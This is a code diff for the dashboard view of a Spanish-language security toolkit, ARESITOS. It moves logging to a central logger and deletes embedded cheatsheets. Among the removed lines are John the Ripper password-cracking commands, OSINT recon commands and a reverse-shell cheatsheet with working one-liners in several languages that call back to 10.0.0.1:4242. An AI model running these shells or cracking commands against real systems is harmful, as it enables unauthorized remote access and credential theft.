@@ -1,4 +1,3 @@
-
 # -*- coding: utf-8 -*-
 """
 PRINCIPIOS DE SEGURIDAD ARESITOS (NO MODIFICAR SIN AUDITORÍA)
@@ -24,6 +23,7 @@ import logging
 import queue
 import io
 import sys
+from aresitos.utils.logger_aresitos import LoggerAresitos
 
 try:
     from aresitos.vista.burp_theme import burp_theme
@@ -180,13 +180,9 @@ class VistaDashboard(tk.Frame):
     def __init__(self, parent):
         super().__init__(parent)
         self.controlador = None
-        self.logger = logging.getLogger(__name__)
+        self.logger = LoggerAresitos.get_instance()
         self.actualizacion_activa = False
         self.shell_detectado = self._detectar_shell()
-
-    # ...existing code...
-        # ...existing code...
-
 
         # Variables para el terminal integrado
         self.terminal_handler = None
@@ -298,22 +294,19 @@ class VistaDashboard(tk.Frame):
     def set_controlador(self, controlador):
         """Establecer el controlador del dashboard."""
         self.controlador = controlador
-        self.logger.info("Controlador establecido en VistaDashboard")
-        
+        self.logger.log("Controlador establecido en VistaDashboard", nivel="INFO", modulo="DASHBOARD")
         # Obtener información del sistema a través del controlador si está disponible
         if self.controlador:
             try:
                 # Intentar obtener información del sistema
                 if hasattr(self.controlador, 'obtener_estado_sistema'):
                     estado_sistema = self.controlador.obtener_estado_sistema()
-                    self.logger.info(f"Estado del sistema obtenido: {estado_sistema}")
-                    
+                    self.logger.log(f"Estado del sistema obtenido: {estado_sistema}", nivel="INFO", modulo="DASHBOARD")
                 if hasattr(self.controlador, 'obtener_metricas_dashboard'):
                     metricas = self.controlador.obtener_metricas_dashboard()
-                    self.logger.info("Métricas del dashboard actualizadas")
-                    
+                    self.logger.log("Métricas del dashboard actualizadas", nivel="INFO", modulo="DASHBOARD")
             except Exception as e:
-                self.logger.error(f"Error obteniendo datos del controlador: {e}")
+                self.logger.log(f"Error obteniendo datos del controlador: {e}", nivel="ERROR", modulo="DASHBOARD")
     
     def crear_interfaz(self):
         """Crear la interfaz principal del dashboard."""
@@ -977,8 +970,9 @@ class VistaDashboard(tk.Frame):
     
     @classmethod
     def log_actividad_global(cls, mensaje, modulo="ARESITOS", nivel="INFO"):
-        """Método de clase para registrar actividad desde cualquier vista."""
+        """Método de clase para registrar actividad desde cualquier vista y logger centralizado."""
         if cls._terminal_widget:
+            from datetime import datetime
             timestamp = datetime.now().strftime("%H:%M:%S")
             emoji_map = {
                 "INFO": "INFO",
@@ -994,11 +988,12 @@ class VistaDashboard(tk.Frame):
                     cls._terminal_widget.insert(tk.END, mensaje_completo)
                     cls._terminal_widget.see(tk.END)
             except (tk.TclError, AttributeError):
-                pass  # Si hay error, no bloquear la operación
-    
+                pass
+        # Registrar en logger centralizado
+        LoggerAresitos.get_instance().log(mensaje, nivel=nivel, modulo=modulo)
+
     def log_actividad(self, mensaje, modulo="ARESITOS", nivel="INFO"):
-        """Método público para que otras vistas registren actividad."""
-        # Usar el método de clase para consistencia
+        """Método público para que otras vistas registren actividad y logger centralizado."""
         VistaDashboard.log_actividad_global(mensaje, modulo, nivel)
     
     def ejecutar_comando_rapido(self, comando):
@@ -1677,174 +1672,7 @@ crontab -l                        # Cron jobs del usuario
 cat /etc/crontab                  # Cron jobs del sistema
 
 ## Análisis de Logs
-tail -f /var/log/auth.log         # Logs de autenticación
-tail -f /var/log/syslog           # Logs del sistema
-grep "Failed password" /var/log/auth.log  # Intentos fallidos
-journalctl -f                     # Systemd logs
-lastlog                           # Último login de usuarios
-
-## Red y Conectividad
-ifconfig                          # Interfaces de red
-ip addr show                      # Interfaces (ip command)
-route -n                          # Tabla de rutas
-arp -a                            # Tabla ARP
-netstat -rn                       # Rutas de red
-lsof -i                           # Archivos y puertos abiertos
-tcpdump -i eth0                   # Captura de tráfico
-
-## Forense Básico
-strings archivo                   # Cadenas legibles
-hexdump -C archivo                # Dump hexadecimal
-file archivo                      # Tipo de archivo
-stat archivo                      # Metadatos del archivo
-find /home -name "*.txt" -mtime -1 # Archivos modificados ayer
-""",
-            
-            "John the Ripper": """
-# JOHN THE RIPPER CHEATSHEET
-
-## Comandos Básicos
-john --list=formats               # Formatos soportados
-john hashes.txt                   # Ataque por diccionario
-john --show hashes.txt            # Mostrar passwords crackeadas
-john --restore                    # Restaurar sesión
-
-## Tipos de Hash
-john --format=raw-md5 hash.txt    # MD5
-john --format=raw-sha1 hash.txt   # SHA1
-john --format=raw-sha256 hash.txt # SHA256
-john --format=nt hash.txt         # NTLM
-john --format=lm hash.txt         # LM
-
-## Modos de Ataque
-john --single hashes.txt          # Single crack mode
-john --wordlist=rockyou.txt hashes.txt  # Dictionary attack
-john --incremental hashes.txt     # Brute force
-john --external=mode hashes.txt   # External mode
-
-## Opciones Útiles
-john --users=admin hashes.txt     # Solo usuario específico
-john --groups=0 hashes.txt        # Solo grupo específico
-john --shell=/bin/bash hashes.txt # Solo usuarios con shell
-john --salts=-1 hashes.txt        # Sin salt específico
-
-## Generación de Wordlists
-john --wordlist=base.txt --rules --stdout > new.txt
-john --incremental=Digits --stdout --session=digits
-
-## Extracción de Hashes
-unshadow passwd shadow > combined.txt    # Combinar passwd/shadow
-pdf2john file.pdf > hash.txt             # PDF
-zip2john file.zip > hash.txt             # ZIP
-rar2john file.rar > hash.txt             # RAR
-ssh2john id_rsa > hash.txt               # SSH key
-""",
-            
-            "Reverse Shells": """
-# REVERSE SHELLS CHEATSHEET
-# NOTA DE SEGURIDAD: Solo para uso en auditorías autorizadas
-
-## Bash
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
-bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
-
-## Netcat
-nc -e /bin/sh 10.0.0.1 4242          # Con -e
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
-
-# Python
-# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-# PHP  
-# php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
-# <?php system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"'); ?>
-
-# Perl
-# perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");};'
-
-# Ruby
-# ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;system sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
-# Java
-# r = Runtime.getRuntime()
-# p = r.system(["/bin/bash","-c","system 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
-# p.waitFor()
-
-# PowerShell
-# powershell -NoP -NonI -W Hidden -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (command $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
-# Listeners
-# nc -lvnp 4242                     # Netcat listener
-# socat file:`tty`,raw,echo=0 tcp-listen:4242  # Socat listener
-# rlwrap nc -lvnp 4242              # Con readline
-""",
-            
-            " OSINT": """
-# OSINT (Open Source Intelligence) CHEATSHEET
-
-## Búsqueda de Dominios
-whois domain.com                  # Información WHOIS
-dig domain.com                    # DNS lookup
-nslookup domain.com              # DNS lookup alternativo
-host domain.com                  # Host lookup
-theHarvester -d domain.com -b google  # Email harvesting
-
-## Subdominios
-sublist3r -d domain.com          # Enumeración de subdominios
-amass enum -d domain.com         # Mapeo de subdominios
-gobuster dns -d domain.com -w wordlist.txt  # Brute force DNS
-
-## Google Dorks
-site:domain.com                  # Páginas de un sitio
-filetype:pdf site:domain.com     # PDFs del sitio
-inurl:admin site:domain.com      # URLs con "admin"
-intitle:"index of" site:domain.com  # Directorios listados
-cache:domain.com                 # Caché de Google
-
-## Shodan
-shodan search apache             # Buscar Apache servers
-shodan search port:22            # SSH servers
-shodan search country:ES         # Dispositivos en España
-shodan search org:"Company Name" # Por organización
-
-## Redes Sociales
-sherlock username                # Buscar username en redes
-social-analyzer -u username      # Análisis de redes sociales
-twint -u username                # Twitter scraping
-
-## Metadatos
-exiftool image.jpg               # Metadatos de imagen
-metagoofil -d domain.com -t pdf  # Metadatos de documentos
-foca                             # Fingerprinting Organizations
-
-## Herramientas Web
-archive.org                      # Wayback Machine
-censys.io                        # Motor de búsqueda de dispositivos
-builtwith.com                    # Tecnologías de sitios web
-netcraft.com                     # Información de hosting
-
-## Phone Numbers
-phoneinfoga scan -n +34123456789 # Información de teléfonos
-truecaller                       # Base de datos de números
-""",
-            
-            "Log Analysis": """
-# LOG ANALYSIS CHEATSHEET
-
-## Ubicaciones de Logs Comunes
-/var/log/auth.log                # Autenticación (Debian/Ubuntu)
-/var/log/secure                  # Autenticación (RedHat/CentOS)
-/var/log/syslog                  # Mensajes del sistema
-/var/log/messages                # Mensajes generales
-/var/log/kern.log                # Kernel messages
-/var/log/apache2/access.log      # Apache access logs
-/var/log/apache2/error.log       # Apache error logs
-/var/log/nginx/access.log        # Nginx access logs
-/var/log/nginx/error.log         # Nginx error logs
-
-## Comandos de Análisis
-tail -f /var/log/auth.log        # Seguimiento en tiempo real
+tail -f /var/log/auth.log         # Seguimiento en tiempo real
 grep "Failed password" /var/log/auth.log  # Intentos fallidos
 grep "Accepted" /var/log/auth.log # Login exitosos
 awk '{print $1}' access.log | sort | uniq -c | sort -nr  # IPs más frecuentes
@@ -1922,7 +1750,7 @@ journalctl -u ssh                # Logs de servicio específico
                                 break
                 
                 if archivo_encontrado:
-                    with open(archivo_encontrado, 'r', encoding='utf-8', errors='ignore') as f:
+                    with open(archivo_encontrado, 'r', encoding='utf-8') as f:
                         contenido = f.read()
                         self.cheatsheet_text.delete(1.0, tk.END)
                         self.cheatsheet_text.insert(1.0, contenido)
